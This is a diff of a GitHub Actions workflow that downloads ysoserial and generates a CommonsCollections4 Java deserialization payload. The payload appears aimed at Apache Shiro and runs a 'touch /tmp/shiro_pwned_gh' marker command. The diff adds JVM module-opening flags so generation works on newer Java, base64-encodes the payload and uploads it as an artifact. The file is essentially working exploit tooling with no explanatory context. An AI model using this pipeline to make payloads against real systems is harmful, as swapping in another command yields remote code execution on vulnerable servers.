@@ -1,4 +1,4 @@
-name: Generate Shiro Payload v2
+name: Generate Shiro Payload v3
 
 on:
   workflow_dispatch:
@@ -11,18 +11,22 @@ jobs:
         run: |
           curl -L -o ysoserial-all.jar https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
           ls -lh ysoserial-all.jar
-          file ysoserial-all.jar
 
-      - name: Generate CommonsCollections4 payload
+      - name: Generate payload (with Java module opens)
         run: |
-          java -jar ysoserial-all.jar CommonsCollections4 "touch /tmp/shiro_pwned_gh" > payload.bin
+          JAVA_OPTS="--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED"
+          JAVA_OPTS="$JAVA_OPTS --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED"
+          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/java.lang=ALL-UNNAMED"
+          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/java.util=ALL-UNNAMED"
+          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED"
+          JAVA_OPTS="$JAVA_OPTS --add-opens java.base/java.io=ALL-UNNAMED"
+          JAVA_OPTS="$JAVA_OPTS --add-opens java.desktop/com.sun.beans=ALL-UNNAMED"
+          
+          java $JAVA_OPTS -jar ysoserial-all.jar CommonsCollections4 "touch /tmp/shiro_pwned_gh" > payload.bin
           echo "Payload size: $(wc -c < payload.bin) bytes"
           base64 -w0 payload.bin > payload.b64
-          echo "Base64 size: $(wc -c < payload.b64)"
-          echo "PAYLOAD_START"
-          head -c 100 payload.b64
-          echo "..."
-          echo "PAYLOAD_END"
+          echo "Base64: $(head -c 50 payload.b64)... ($(wc -c < payload.b64) chars)"
+          echo "SHA256: $(sha256sum payload.bin | cut -d' ' -f1)"
 
       - name: Upload payload
         uses: actions/upload-artifact@v4
